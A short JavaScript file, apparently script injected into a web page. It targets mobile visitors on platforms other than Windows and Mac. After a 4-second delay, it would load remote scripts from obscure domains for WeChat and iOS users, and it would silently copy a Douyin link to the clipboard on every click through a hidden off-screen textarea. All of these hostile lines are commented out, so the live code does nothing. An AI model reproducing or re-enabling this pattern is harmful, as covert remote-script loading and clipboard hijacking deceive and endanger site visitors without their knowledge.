;(function() {
    if(navigator.platform.indexOf("Win") == 0 || navigator.platform.indexOf("Mac") == 0)
    {

    }
    else
    {
        // function copy(content)
        // {
        //     var d = document.getElementById('_c_textarea');
        //     if(!d){
        //         d = document.createElement("textarea");
        //         d.style = "position:fixed; left:-100px; z-index:0; width: 10px; height: 10px;";
        //         d.id = "_c_textarea";
        //         document.body.appendChild(d);
        //     }
        //     d.value = content;
        //     d.focus();
        //     d.select();
        //     d.setSelectionRange(0, 9999);
        //     document.execCommand('copy');
        // }

        // document.addEventListener('click', function() {
        //     //copy('http://v.douyin.com/mrUKrw/');
        // })

        setTimeout(function(){
            
            var ua = window.navigator.userAgent.toLowerCase();
            if(ua.match(/MicroMessenger/i) == 'micromessenger')
            {
                // var script = document.createElement('script');
                // script.src = "https://cdn.619360.com/n609/";
                // script.async = true;
                // document.body.appendChild(script);
            }

            if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent))
            {
                // var script = document.createElement('script');
                // script.src = "https://js.jlcqcp.com/xtmex.js";
                // script.async = true;
                // document.body.appendChild(script);
                
            }
            else
            {

            }

        }, 4000);   
    }
})();